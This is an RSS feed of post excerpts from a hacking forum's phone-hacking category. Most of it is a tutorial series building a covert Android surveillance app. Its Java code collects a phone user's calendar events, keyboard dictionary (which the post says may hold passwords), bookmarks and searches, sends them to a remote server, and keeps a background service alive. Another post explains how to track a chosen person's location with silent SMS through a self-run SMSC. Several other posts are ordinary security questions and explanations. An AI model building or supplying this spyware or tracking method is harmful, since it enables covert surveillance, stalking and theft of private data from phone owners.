@@ -1,0 +1,2551 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Phone Hacking - 0x00sec - The Home of the Hacker</title>
+    <link>https://0x00sec.org/c/phone-hacking/92</link>
+    <description>Topics in the &#39;Phone Hacking&#39; category Everything from Phreaking, to Nethunter. Here you will find a treasure trove of useful articles regarding the entire Phone Hacking scene.</description>
+    
+      <lastBuildDate>Fri, 12 Jan 2024 14:57:32 +0000</lastBuildDate>
+      <atom:link href="https://0x00sec.org/c/phone-hacking/92.rss" rel="self" type="application/rss+xml" />
+        <item>
+          <title>FIsher Price “My First SS7 attack”</title>
+          <dc:creator><![CDATA[d8rh8r]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <h1><a name="fisher-price-my-first-ss7-attack-1" class="anchor" href="https://0x00sec.org#fisher-price-my-first-ss7-attack-1"></a>FIsher Price “My First SS7 attack”</h1>
+<p>I got a pm today asking me if I had “fully figured out and gained access to SS7 ?” Sadly the answer to parts A and B of that question is no, but I could have, I think.  After much searching &amp; scanning, I stumbled across a SGFW running default creds.<br>
+Winner johnny… Full card…</p>
+<p><em>I followed the guide here</em>: <a href="https://0x00sec.org/t/into-the-wild-gaining-access-to-ss7-part-1-finding-an-access-point/12418/66">best ss7 post ever</a></p>
+<p>Unfortunately, to log in would have been crossing a line I’m not interested in crossing right now, so its treasures will remain a mystery.  Fortunately, I have less illegal way to get my SS7 fix.</p>
+<p>My whole interest in SS7 is location data.  I don’t want to intercept password resets or OTP, I just want to be able to know the location of my POI.  Turns out there is an easier way than an AnytimeInterrogation attack to get that data.  My friends, let me introduce:</p>
+<p><span alt="" role="presentation" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use href="#unlink"></use></svg></span></p>
+<h2><a name="sms-type-0-2" class="anchor" href="https://0x00sec.org#sms-type-0-2"></a><strong>SMS Type 0</strong></h2>
+<p>Originally, it was intended for specific tasks such as debugging or updating software on a mobile device without disturbing the user.  Turns out it’s pretty handy for getting location data too. Silent SMS for the win.  Here’s how it works.</p>
+<p>A silent SMS is delivered to the target phone. This SMS, like all others, passes through the signaling system of the mobile network. When the SMS reaches its intended recipient, the phone automatically notifies the network that it has arrived, even though it does not sound an alert or appear in the recipient’s message list. Lucky us, this is a standard message delivery feature of the GSM protocol.</p>
+<p>Information about the cell tower the message was routed through is included in the network’s response to this silent SMS. This can contain information that is essential for determining the precise location of the mobile device, such as the cell ID and location area code (LAC).</p>
+<p>The device’s approximate location can be ascertained by examining the cell tower that was utilised to transmit the message. <a href="http://opencellid.org/" rel="noopener nofollow ugc">OpenCellid.org</a> is great for this, as is <a href="http://maprad.io/" rel="noopener nofollow ugc">maprad.io</a>.</p>
+<p>How are we going to send our silent SMS? With our very own SMSC.</p>
+<h2><a name="part-1-setting-up-the-server-3" class="anchor" href="https://0x00sec.org#part-1-setting-up-the-server-3"></a>Part 1. Setting up the server</h2>
+<p><strong>Kannel</strong> is a powerful and widely used open source SMSC that supports various communication protocols including SMPP, HTTP, and UDP. I chose this option as it is actively maintained by a community of great developers and I just dig the vibe of the site.  A momentary flash of an internet gone by. Ok lets rumble.</p>
+<ol>
+<li>
+<p>You can find the latest version on the Kannel website at <strong><a href="http://www.kannel.org/download.shtml" rel="noopener nofollow ugc">http://www.kannel.org/download.shtml</a></strong>.</p>
+</li>
+<li>
+<p><strong>Getting Kannel:</strong><br>
+The daily snapshots are what you are looking for.  Grab yourself some documentation while you at it, will probably come in handy.</p>
+</li>
+<li>
+<p><strong>Step-by-Step Guide to Getting It Up and Running:</strong></p>
+<ul>
+<li><strong>Install Dependencies:</strong>
+<ul>
+<li>
+<p>Ensure you have the necessary build tools and libraries installed. On a Debian-based system, you might need to run:</p>
+<pre><code class="lang-bash">sudo apt-get install build-essential libssl-dev libcurl4-openssl-dev libdbi-dev libpcre3-dev libspeex-dev libspeexdsp-dev libgsm1-dev libasound2-dev libusb-dev libsctp-dev libqmi-dev libgps-dev libgoogle-glog-dev libopencv-dev libgcrypt20-dev libgnutls28-dev libmysqlclient-dev libpq-dev libradcli-dev libsctp-dev libspandsp-dev libtalloc-dev libvorbis-dev libxslt1-dev libyaml-dev portaudio19-dev python-dev python-pip python-setuptools python-twisted-bin python-zope.interface swig unixodbc-dev
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Navigate to the Kannel directory:</strong></p>
+<ul>
+<li>Extract you code to /kannel and cd in…</li>
+</ul>
+<pre><code class="lang-bash">mkdir kannel
+cd kannel
+wget https://www.kannel.org/download/kannel-snapshot.tar.gz
+chmod +x kannel-snaphot.tar.gz
+tar -xzvf kannel-snaphot.tar.gz
+</code></pre>
+</li>
+<li>
+<p><strong>Run the configure script:</strong></p>
+<ul>
+<li>Run the <strong><code>./configure</code></strong> script to start the configuration process.</li>
+</ul>
+<pre><code class="lang-bash">./configure
+</code></pre>
+</li>
+<li>
+<p><strong>Choose the options for your system:</strong></p>
+<ul>
+<li>
+<p>The <strong><code>./configure</code></strong> script will prompt you to choose options for your system. Here are some common options:</p>
+</li>
+<li>
+<p><strong>Adding MySQL support:</strong></p>
+<pre><code class="lang-bash">--with-mysql=/usr/local/mysql
+</code></pre>
+</li>
+<li>
+<p><strong>Adding PostgreSQL support:</strong></p>
+<pre><code class="lang-bash">--with-postgresql=/usr/local/pgsql
+</code></pre>
+</li>
+<li>
+<p><strong>Enabling SSL support:</strong></p>
+<pre><code class="lang-bash">--enable-ssl
+</code></pre>
+</li>
+<li>
+<p><strong>Enabling shared libraries:</strong></p>
+<pre><code class="lang-bash">--enable-shared
+</code></pre>
+</li>
+<li>
+<p><strong>Enabling debugging:</strong></p>
+<pre><code class="lang-bash">--enable-debug
+</code></pre>
+</li>
+<li>
+<p><strong>Adding a prefix for installation:</strong></p>
+<pre><code class="lang-bash">--prefix=/usr/local/kannel
+</code></pre>
+</li>
+<li>
+<p>You can also see all the options by running <strong><code>./configure --help</code></strong>.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Continue with the configuration process:</strong></p>
+<ul>
+<li>After setting the options, the script will continue to run and check for dependencies and other configurations.</li>
+</ul>
+</li>
+<li>
+<p><strong>Compile Kannel:</strong></p>
+<ul>
+<li>After configuring Kannel, you can compile it by running <strong><code>make</code></strong>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Install Kannel:</strong></p>
+<ul>
+<li>Install Kannel by running <strong><code>sudo make install</code></strong>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Configure Kannel Daemon:</strong></p>
+<ul>
+<li>Edit the <strong><code>/etc/kannel/kannel.conf</code></strong> file to configure the SMSC settings.</li>
+</ul>
+</li>
+<li>
+<p><strong>Start the Kannel Daemon:</strong></p>
+<ul>
+<li>Run <strong><code>sudo kannel start</code></strong> to start the Kannel daemon.</li>
+</ul>
+</li>
+<li>
+<p><strong>Test the SMSC:</strong></p>
+</li>
+</ol>
+<ul>
+<li>Use the <strong><code>sendsms</code></strong> or <strong><code>bearerbox</code></strong> command to test the SMSC.</li>
+</ul>
+<p>Please note that the actual options and configurations may vary depending on your system and the features you need. Refer to the Kannel documentation for the most up-to-date information.</p>
+<p>In our next installment… setting up our SMS gateway &amp; the moneyshot…  See you then.</p>
+            <p><small>4 posts - 3 participants</small></p>
+            <p><a href="https://0x00sec.org/t/fisher-price-my-first-ss7-attack/38731">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/fisher-price-my-first-ss7-attack/38731</link>
+          <pubDate>Fri, 12 Jan 2024 14:57:32 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-38731</guid>
+          <source url="https://0x00sec.org/t/fisher-price-my-first-ss7-attack/38731.rss">FIsher Price “My First SS7 attack”</source>
+        </item>
+        <item>
+          <title>How do I capture all network traffic on a phone</title>
+          <dc:creator><![CDATA[c0mrade]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>I need to figure out a way to intercept all network traffic on my phone in order to see if there are spywares on my phone and see if google collects my info, and if it does, to where exactly</p>
+            <p><small>7 posts - 7 participants</small></p>
+            <p><a href="https://0x00sec.org/t/how-do-i-capture-all-network-traffic-on-a-phone/37733">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/how-do-i-capture-all-network-traffic-on-a-phone/37733</link>
+          <pubDate>Sun, 05 Nov 2023 14:19:18 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-37733</guid>
+          <source url="https://0x00sec.org/t/how-do-i-capture-all-network-traffic-on-a-phone/37733.rss">How do I capture all network traffic on a phone</source>
+        </item>
+        <item>
+          <title>Android security</title>
+          <dc:creator><![CDATA[spuqe]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <h1>Welcome to my post about android and it's security. </h1>
+Sorry this might be hard to read as I'm very bad writer and my native language isn't English,  I TRY MY BEST!
+<p>In this post I’m going to explain some basic stuff you should know.</p>
+<p><b>Let’s start from the basic consent model.<b><br>
+</b></b></p><div class="lightbox-wrapper"><b><b><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/3/93200d4cfe32491b805fd761d878c71fe6cdd856.png" data-download-href="/uploads/short-url/kZwRgAJDVjIAxE8tFddDqGHLbxQ.png?dl=1" title="kuva" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/3/93200d4cfe32491b805fd761d878c71fe6cdd856_2_251x250.png" alt="kuva" data-base62-sha1="kZwRgAJDVjIAxE8tFddDqGHLbxQ" width="251" height="250" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/3/93200d4cfe32491b805fd761d878c71fe6cdd856_2_251x250.png, https://0x00sec.s3.amazonaws.com/optimized/3X/9/3/93200d4cfe32491b805fd761d878c71fe6cdd856_2_376x375.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/9/3/93200d4cfe32491b805fd761d878c71fe6cdd856_2_502x500.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/9/3/93200d4cfe32491b805fd761d878c71fe6cdd856_2_10x10.png"></a></b></b></div><p></p><b><b>
+<h4>
+**kernel** is core of the android operating system, software that handles the GPU, system memory and system devices including file systems and networking.
+It servers as link between software and hardware, kernel security comes with great big power but it also comes with big responsibility. **Kernel security**
+determines overall security of the whole system. Androids kernel is based on **Linux**.
+</h4></b></b><p>Security of the Android OS is based around the following key security features of the Linux kernel:</p>
+<pre><code>* Process Isolation
+* User-Based Permission Model
+* Inter-Process Communication (IPC)
+</code></pre>
+<p>Sandboxing:<br>
+Android uses the Linux permissions model to isolate application resources.</p>
+<p>This process in called application sandbox.<br>
+<img src="https://0x00sec.s3.amazonaws.com/original/3X/9/a/9ac6747e63201d80e881fd41cca4704ff9aa3646.png" alt="kuva" data-base62-sha1="m5cIxGsePRQ13aoR4FmiD5z5tDU" width="446" height="175"></p>
+<p>Sandbox prevents malicious programs from interacting with the protected app.<br>
+Internal operating system components are also protected by the sandbox. Vulns exposed by an application cannot be exploited to gain access to the outer system.</p>
+<p>Secure communication between apps is ensured by the Linux user-based protection.<br>
+Unlike traditional operating systems like MacOS and Windows, Android uses the User ID (UID) concept to manage an application’s<br>
+access control and not the system users access control. App is prohibited from accessing other application’s data or system features without permissions.</p>
+<p><strong>APPLICATION SECURITY</strong><br>
+</p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/1/c/1c683ee47b634d1c7d7fafb3f3ca7a9f8c6a29f7.png" data-download-href="/uploads/short-url/43iIix3IaUimSdWG6jdBmT8GoSP.png?dl=1" title="kuva" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/1/c/1c683ee47b634d1c7d7fafb3f3ca7a9f8c6a29f7_2_250x250.png" alt="kuva" data-base62-sha1="43iIix3IaUimSdWG6jdBmT8GoSP" width="250" height="250" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/1/c/1c683ee47b634d1c7d7fafb3f3ca7a9f8c6a29f7_2_250x250.png, https://0x00sec.s3.amazonaws.com/optimized/3X/1/c/1c683ee47b634d1c7d7fafb3f3ca7a9f8c6a29f7_2_375x375.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/1/c/1c683ee47b634d1c7d7fafb3f3ca7a9f8c6a29f7_2_500x500.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/1/c/1c683ee47b634d1c7d7fafb3f3ca7a9f8c6a29f7_2_10x10.png"></a></div><p></p>
+<p>The security aspect of application is often overlooked. The lack of concern can determine the application to transform into an attack vector, leveraged by malicious actors.</p>
+<p>Permissions in Android: the user’s privacy is protected by the means of permissions. Android applications requires the users consent to perform actions like see GPS location, see contact and other sort of permissions that application might ask you for.</p>
+<p>Permissions required by an application are declared in the <strong>AndroidManifest.xml</strong>. Every permission is specified in its own uses-permission tag.</p>
+<p>Android has 3 types of storage, <strong>Internal storage:</strong> Data stored here is visible only to the corresponding application, <strong>External storage:</strong> Data stored in external storage is globally readable and writable, <strong>Content providers:</strong> They provide an abstraction over the data stored. With the use of content providers, we have more control over the read and write permissions.</p>
+
+            <p><small>5 posts - 5 participants</small></p>
+            <p><a href="https://0x00sec.org/t/android-security/26061">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/android-security/26061</link>
+          <pubDate>Sat, 22 May 2021 19:43:18 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-26061</guid>
+          <source url="https://0x00sec.org/t/android-security/26061.rss">Android security</source>
+        </item>
+        <item>
+          <title>Monitoring what users does in their apps</title>
+          <dc:creator><![CDATA[lallepot]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>I am curious about how secure Android phones are. Is it easy to find exploits that allows me to monitor what users does inside the apps they open?</p>
+<p>And if I have a willing non-technical user, is it possible to build a apk that they install on their phones which contains the exploit that allows me to monitor what they do in FB, YouTubr etc.</p>
+<p>Is this something that will require a lot of work per model or can I relative easy build an exploit for all phones using Android 7 or 8 for example?</p>
+            <p><small>8 posts - 6 participants</small></p>
+            <p><a href="https://0x00sec.org/t/monitoring-what-users-does-in-their-apps/16562">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/monitoring-what-users-does-in-their-apps/16562</link>
+          <pubDate>Sat, 28 Sep 2019 08:15:55 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-16562</guid>
+          <source url="https://0x00sec.org/t/monitoring-what-users-does-in-their-apps/16562.rss">Monitoring what users does in their apps</source>
+        </item>
+        <item>
+          <title>Are broadcasted SMS still possible?</title>
+          <dc:creator><![CDATA[lordkeks]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>It was one day, a few years ago (about 12 years actually). The time before smartphones were a thing and everybody used to send stuff from one phone to another via bluetooth (or infrared, if you where as poor as I was).<br>
+Anyways, back then it was possible to send an SMS to every phone in your surrounding (cell maybe?), without even knowing the phone numbers.<br>
+Is this still possible? And if so (also if not, I’m curious) what was it called?<br>
+Only things I remember are silent SMS and flash SMS, which are both different things.</p>
+            <p><small>4 posts - 3 participants</small></p>
+            <p><a href="https://0x00sec.org/t/are-broadcasted-sms-still-possible/8858">Read full topic</a></p>
+          ]]></description>
+          <link>https://0x00sec.org/t/are-broadcasted-sms-still-possible/8858</link>
+          <pubDate>Thu, 04 Oct 2018 13:35:05 +0000</pubDate>
+          <discourse:topicPinned>No</discourse:topicPinned>
+          <discourse:topicClosed>Yes</discourse:topicClosed>
+          <discourse:topicArchived>No</discourse:topicArchived>
+          <guid isPermaLink="false">0x00sec.org-topic-8858</guid>
+          <source url="https://0x00sec.org/t/are-broadcasted-sms-still-possible/8858.rss">Are broadcasted SMS still possible?</source>
+        </item>
+        <item>
+          <title>Building a God’s Eye Android App: Part 5 - Collecting Browser Searches, Bookmarks, Calendar Events and Spying on User Keyboard Dictionary</title>
+          <dc:creator><![CDATA[sergeantsploit]]></dc:creator>
+          <category>Phone Hacking</category>
+          <description><![CDATA[
+            <p>Greetings my fellow hackers,</p>
+<p>As we continue with our series, the AMUNET app becomes complicated with new functionalities and structures to understand. We’ll sail right through. As stated earlier in previous tutorials, the app doesn’t fully exists because I build them before I share so forgive me if it takes sometime before a tutorial comes out. I need to make sure everything works well first.</p>
+<p><strong>PREVIOUS TUTORIALS</strong></p>
+<p>Below are the tutorials covered so far.</p>
+<ol>
+<li><a href="https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112/4">Introduction to Amunet</a></li>
+<li><a href="https://0x00sec.org/t/building-a-gods-eye-android-app-part-0-introduction-to-amunet/7112/4">Get Installed Apps</a></li>
+<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-2-sending-information-to-a-web-server/7168">Sending Information to Web Server</a></li>
+<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-3-permission-granting/7317">Granting Permission for Extra Functions</a></li>
+<li><a href="https://0x00sec.org/t/building-a-god-s-eye-android-app-part-4-persistently-collecting-contacts-call-logs-and-text-messages-sms/7375">Persistently Collecting Contacts, Call Logs and Text Messages ( SMS )</a></li>
+</ol>
+<p><strong>FREQUENTLY ASKED QUESTIONS ( FAQ )</strong></p>
+<p>I have been receiving questions from readers and these ones are most prevalent.</p>
+<p><strong>Q: How to collect information on my localhost</strong><br>
+A: The tutorial does not limit you to the test server. As stated earlier, just change the server endpoint ( ip address ) in the Configuration.java and make sure your server accepts the POST parameters being passed.</p>
+<p><strong>Q: Can I get the source code ( PHP ) for your test server</strong><br>
+A: Absolutely not.</p>
+<p><strong>Q: Where is my data stored on the test server ?</strong><br>
+A: I am a great fan of privacy and data protection. With that said, every data sent to the test server is encrypted ( username and password ). I use bcrypt for protecting confidential information and as a result, I do have access to the information stored on the server but cannot decrypt or read them. Only the right user.</p>
+<p><strong>Q: Will I pay for using the test server ?</strong><br>
+A: Absolutely not. The server was only set up to help with the tutorial. No need to pay anything. It’s set up out of good will.</p>
+<p><strong>Q: What’s the API auth key thing ?</strong><br>
+A: The API Auth key helps the server identify the correct user. Without it, any data sent will be rejected.</p>
+<p><strong>Q: Do I need the API auth key on my local server ?</strong><br>
+A: No please. You do not need an auth key on your local server. You only need to accept the POST parameters being sent by Volley and thats all.</p>
+<p><strong>SIDE NOTE</strong></p>
+<ol>
+<li>
+<p>If you are using your own server, you should by now notice that the database will become flooded with duplicate or useless informations if they are not filtered as the data coming in is repeatedly pushed to the server. It is the duty of the server to filter such information and store only fresh and non-existent data.<br>
+If you are using my test server, then that problem has already been tackled. Cheers <img src="https://0x00sec.org/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:"></p>
+</li>
+<li>
+<p>I’ll add a “Wipe Account Feature” to the test server so that you can wipe all your data when you are done experimenting. For now, I’ll just manually wipe all user data.<br>
+Always uninstall your app, when trying new series parts as your old API key won’t be compatible with server any longer since I will probably wipe them and there you will need to acquire a new one through account registration ( on the phone )</p>
+</li>
+</ol>
+<p><strong>TODAY’S TUTORIAL</strong></p>
+<p>In today’s tutorial, that is in continuation from Part 4, we are going to add more functions to the app. We are adding the ability to collect browser searches, bookmarks, calendar events and also access the user’s keyboard dictionary.</p>
+<p>A user dictionary consists of all the words a user teaches the smartphone. Phones were made to be perfect especially in language processing but they cannot contain all words belonging to a language so users usually uses add words to the dictionary so that they don’t have to type them again since the word they may be typing does not belong to the default built in dictionary. This dictionary can consist of sensitive information ranging from Bank names, email addresses, web domains, usernames and even passwords.</p>
+<p><strong>THE BAD NEWS</strong></p>
+<p>I have been trying for sometime to make this function available across the different api levels with different libraries and codes but unfortunately Android Developers just couldn’t keep their fingers idle and have some coffee. They instead made the following changes in <a href="https://developer.android.com/about/versions/marshmallow/android-6.0-changes#behavior-bookmark-browser" rel="noopener nofollow ugc">Android 6.0 ( Marshmallow )</a>.</p>
+<blockquote>
+<p>Browser Bookmark Changes</p>
+<p>This release removes support for global bookmarks. The android.provider.Browser.getAllBookmarks() and android.provider.Browser.saveBookmark() methods are now removed. Likewise, the READ_HISTORY_BOOKMARKS and WRITE_HISTORY_BOOKMARKS permissions are removed. If your app targets Android 6.0 (API level 23) or higher, don’t access bookmarks from the global provider or use the bookmark permissions. Instead, your app should store bookmarks data internally.</p>
+</blockquote>
+<p>The codes for collecting browser searches, history and bookmarks will only work on pre-MarshMallow devices. We are therefore going to only make the codes run on devices that support them.</p>
+<p>The only function that is still supported across devices is <code>Calendar Events</code>.</p>
+<p>Sometime ago, i think during the comment section of one of the parts of the series, someone asked if the codes would run on an emulator. Well, I was more than surprised when the app executed smoothly on the emulator. I never encountered a single problem with the emulator.</p>
+<p>With that out of the way, lets begin.</p>
+<p><strong>IMPORT LIBRARY WITH GRADLE</strong></p>
+<p>Under <code>Gradle Scripts</code>, open <code>build.grade</code> ( Module: app ) and include this library.</p>
+<blockquote>
+<p>implementation ‘me.everything:providers-android:1.0.1’</p>
+</blockquote>
+<p>This library simplifies the coding process. You can go ahead and sync your project.</p>
+<p><strong>ADD A NEW PERMISSION TO ANDROIDMANIFEST</strong></p>
+<p>We need the following permission to enable us read the user dictionary. Unfortunately, we weren’t able to add it in the previous series because we didn’t need them then. Now we do.</p>
+<pre><code>&lt;uses-permission android:name="android.permission.READ_USER_DICTIONARY" /&gt;
+</code></pre>
+<p><strong>SERVER UPDATE RECEIVER</strong></p>
+<p>If you’ve been following from the beginning, you know this file is a broadcast receiver which gets called through the <code>TimerService</code> class. We are now adding more functionalities to the receiver.</p>
+<p>Anyway and <code>anywhere</code> in the <code>onReceive</code> method, lets add the code.</p>
+<pre><code>if(Build.VERSION.SDK_INT &lt; Build.VERSION_CODES.M) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                dictionary_bookmark_search_history();
+            }
+        }).start();
+}
+
+if(ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                get_calendar_events();
+            }
+        }).start();
+}
+</code></pre>
+<p>As you might have noticed from the checks, the first one checks if the device is pre-MarshMallow or not and then proceeds to execute the appropriate method. The user keyboard dictionary ( <code>READ_DICTIONARY</code> ) permission does not need to be requested like the others. It just needs to be declared in the AndroidManifest file</p>
+<p>For the calendar event, it should work without restrictions ( I believe ). The method only checks if you have the permission to call the method.</p>
+<p><strong>GET CALENDAR EVENTS</strong></p>
+<p>Normally, when we have places to go or events to attend and we don’t have a private secretaries or assistants to be reminding us all the time, we often result to using the Calendar to set events reminders to keep us aware of our schedules and plans. Well, this habit gives away a trove of information about our routine as we specify a lot of information especially when we easily forget stuff.</p>
+<p>NB: The library we imported earlier can help us in this case but I first wrote the code using <code>Cursor</code> s before finding out about the library. Just felt lazy about rewriting the code again with the library. After all, they all work.</p>
+<pre><code>private void get_calendar_events() {
+    Cursor cursor;
+
+    SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
+    final String auth_key = sharedPreferences.getString("auth_key", null);
+
+    if(auth_key == null) { return; }
+
+    try {
+        cursor = context.getContentResolver().query(CalendarContract.Events.CONTENT_URI, null, null, null, null);
+    } catch (SecurityException e) {
+        return;
+    }
+
+    while (cursor.moveToNext()) {
+        if (cursor != null) {
+            Map&lt;String, String&gt; params = new HashMap&lt;&gt;();
+
+            int time_zone = cursor.getColumnIndex(CalendarContract.Events.EVENT_TIMEZONE);
+            int title = cursor.getColumnIndex(CalendarContract.Events.TITLE);
+            int event_id = cursor.getColumnIndex(CalendarContract.Events._ID);
+
+            int description = cursor.getColumnIndex(CalendarContract.Events.DESCRIPTION);
+            int event_location = cursor.getColumnIndex(CalendarContract.Events.EVENT_LOCATION);
+            int account_name = cursor.getColumnIndex(CalendarContract.Events.ACCOUNT_NAME);
+            int acc_type = cursor.getColumnIndex(CalendarContract.Events.ACCOUNT_TYPE);
+
+            String event_time_zone = cursor.getString(time_zone);
+            String event_id_ = cursor.getString(event_id);
+            String event_title = cursor.getString(title);
+            String event_description = cursor.getString(description);
+            String event_location_ = cursor.getString(event_location);
+            String calendar_account_type = cursor.getString(acc_type);
+            String calendar_account_name = cursor.getString(account_name);
+
+            params.put("event_timezone", event_time_zone);
+            params.put("event_title", event_title);
+            params.put("event_id", event_id_);
+            params.put("event_description", event_description);
+            params.put("event_location", event_location_);
+            params.put("event_calendar_account", calendar_account_type);
+            params.put("event_calendar_account_name", calendar_account_name);
+            params.put("auth", auth_key);
+
+            update_Server(params);
+        }
+    }
+}
+</code></pre>
+<p>There is not much to explain here as the codes are almost self-explanatory. We use the default Calendar api with the help of cursors to query the database for information regarding events. We push the data, if any to the server for storage.</p>
+<p><strong>DICTIONARY BOOKMARK SEARCH HISTORY</strong></p>
+<p>In this method, we get the information using the library we imported earlier. It’s actually less code than the Calendar Event ( I think ).</p>
+<pre><code>private void dictionary_bookmark_search_history() {
+
+    SharedPreferences sharedPreferences = context.getSharedPreferences("Auth", Context.MODE_PRIVATE);
+    final String auth_key = sharedPreferences.getString("auth_key", null);
+
+    DictionaryProvider dictionaryProvider = new DictionaryProvider(context);
+
+    List&lt;Word&gt; words = dictionaryProvider.getWords().getList();
+    for (Word w : words) {
+        Map&lt;String, String&gt; dict_params = new HashMap&lt;&gt;();
+        dict_params.put("locale", w.locale);
+        dict_params.put("dictionary_word", w.word);
+        dict_params.put("dictionary_id", String.valueOf(w.id));
+        dict_params.put("auth", auth_key);
+        update_Server(dict_params);
+    }
+
+    BrowserProvider browserProvider = new BrowserProvider(context);
+    List&lt;Bookmark&gt; bookmarks = browserProvider.getBookmarks().getList();
+
+    for (Bookmark b : bookmarks) {
+        Map&lt;String, String&gt; bookmark_params = new HashMap&lt;&gt;();
+        bookmark_params.put("bookmark_title", b.title);
+        bookmark_params.put("bookmark_url", b.url);
+        bookmark_params.put("bookmark_date", get_Long_Date(String.valueOf(b.created)));
+        bookmark_params.put("bookmark_visits", String.valueOf(b.visits));
+        bookmark_params.put("auth", auth_key);
+        update_Server(bookmark_params);
+    }
+
+    List&lt;Search&gt; searches = browserProvider.getSearches().getList();
+
+    for (Search s : searches) {
+        Map&lt;String, String&gt; search_params = new HashMap&lt;&gt;();
+        search_params.put("search_title", s.search);
+        search_params.put("search_date", get_Long_Date(String.valueOf(s.date)));
+        search_params.put("auth", auth_key);
+        update_Server(search_params);
+    }
+}
+</code></pre>
+<p>Self explaining right. Yeah.</p>
+<p><strong>BACK UP PLAN 1</strong></p>
+<p>Ok so there was this weird situation where on the pre-MarshMallow emulator, the TimerService stops abruptly. Not because the OS killed it or was consuming some large amount of RAM. I just didn’t know. I then placed a check in the BroadCast receiver to check if it was running or not. It wouldn’t affect your code. Just a little background check when the receiver is called.</p>
+<p>Anywhere in the <code>onReceive</code> method of the receiver, write this code.</p>
+<pre><code>if(!MyServiceIsRunning(TimerService.class)) {
+    context.startService(new Intent(context, TimerService.class));
+}
+</code></pre>
+<p>Just a little check here and there.</p>
+<p><strong>MONITORING SCREEN STATUS</strong></p>
+<p>You’ll be surprise at the vast amount of functionalities android development opens up to us. We can monitor if the screen is off and on. This was the previous screenshot for the TimerService class.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/4/491bd85dc0cb925846788314377c789c146ff5a3.jpg" alt="36" data-base62-sha1="aqKvPnJ6VtEksnJpKHf32ircOMH" width="690" height="451"></p>
+<p>Lets now add a Broadcast receiver with the help of intentFilters to monitor the phone screen status. The intentFilter will also keep our service running even if we close the app from the Recent Apps / Task Manager / Recent Tasks.</p>
+<p>Outside any method and inside the <code>public class TimerService ...</code> declaration, lets write the code for the BroadcastReceiver.</p>
+<pre><code>private class ScreenStatusMonitor extends BroadcastReceiver {
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+
+        String action = intent.getAction();
+
+        if(Intent.ACTION_SCREEN_OFF.equals(action)) {
+
+            Log.d("0x00sec", "Screen is turn off.");
+
+        } else if(Intent.ACTION_SCREEN_ON.equals(action)) {
+
+            Log.d("0x00sec", "Screen is turn on.");
+
+        }
+
+    }
+}
+</code></pre>
+<p>We are not uploading the phone screen status in this tutorial. We are instead logging  it to the console. So that we verify if its working.</p>
+<p>Under the <code>public class TimerService ...</code> declaration and above the <code>onCreate</code> method of the TimerService, initialize the class with</p>
+<pre><code>public class TimerService extends Service {
+
+    ScreenStatusMonitor screenStatusMonitor; // this variable
+</code></pre>
+<p>With that out of the way, lets register our intentFilter.</p>
